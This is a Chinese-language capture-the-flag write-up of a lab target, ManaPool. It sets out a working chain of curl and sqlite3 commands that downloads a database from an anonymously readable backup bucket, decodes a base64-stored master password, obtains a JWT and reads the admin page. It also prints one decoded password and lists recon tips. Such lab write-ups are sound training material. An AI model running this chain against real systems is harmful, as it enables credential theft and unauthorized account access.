## 题解

### 入口与指纹

Next.js 站点（`ManaPool`），80 与 8333 两个端口。8333 是 S3rver：
`GET /` 返回 `ListAllMyBucketsResult`，里面有 `assets` 和 `backups` 两个桶。

### 关键观察

**1. `backups` 桶匿名可读，里面是 SQLite 备份。**

```bash
curl http://$T:8333/backups/          # Key: manapool.db
curl http://$T:8333/backups/manapool.db -o manapool.db
sqlite3 manapool.db 'select * from users'
```

`users` 表 5 行，`password` 是 **base64**，`will.rogers` 的 `isMaster=1`。

**2. 站点有一个没写进首页导航的登录页 `/adminpanel`。**

前端 chunk `app/adminpanel/page-*.js` 显示：表单 POST `/api/auth`，成功时
`Cookies.set("token", token)` 然后 `router.push("/adminpanel/profile")`。

**3. `/api/auth` 用 `email` + base64 解码后的口令登录，返回 JWT。**

```bash
curl -sS -X POST -H 'Content-Type: application/json' \
  -d '{"email":"will.rogers@manapool.com","password":"NoENVMxjGK3N3kG"}' \
  http://$T/api/auth
# {"message":"Done","token":"eyJ...uid":"9666"...}
```

**4. `/adminpanel/profile` 用 `token` cookie 读取用户并渲染 flag。**

### 利用链

```bash
T=$(head -1 .target)          # IP
# 1. 拉备份库
curl -sS "http://$T:8333/backups/manapool.db" -o /tmp/m.db
# 2. 取 master 口令并 base64 解码
PW=$(sqlite3 /tmp/m.db "select password from users where isMaster=1" | base64 -d)
# 3. 登录拿 JWT
TOK=$(curl -sS -X POST -H 'Content-Type: application/json' \
  -d "{\"email\":\"will.rogers@manapool.com\",\"password\":\"$PW\"}" \
  "http://$T/api/auth" | python3 -c 'import json,sys;print(json.load(sys.stdin)["token"])')
# 4. 带 token cookie 读管理页
curl -sS -H "Cookie: token=$TOK" "http://$T/adminpanel/profile" | grep -o 'flag{[^}]*}'
```

### flag 位置

`/adminpanel/profile`（`isMaster=1` 的用户可见）的渲染结果。

## 复盘

- **对象存储的备份桶是凭据金矿。** 先 `GET /` 列桶，再列每个桶的 key；`backups/*.db` 直接下载。
- **`password` 是 base64 不是哈希。** 看到可打印 base64 先解一次。
- **登录页可能不在首页导航里。** `/adminpanel`、`/admin`、`/console` 这类词要主动扫；
  扫到后读它的前端 chunk，能直接看到 API 路径和 token 的存放方式（cookie 名）。
- **`/api/*` 的 token 传递位置各不相同。** 本题 `/api/user` 读 `?token=`，
  而 `/adminpanel/profile` 读 `Cookie: token=`；两种都试。
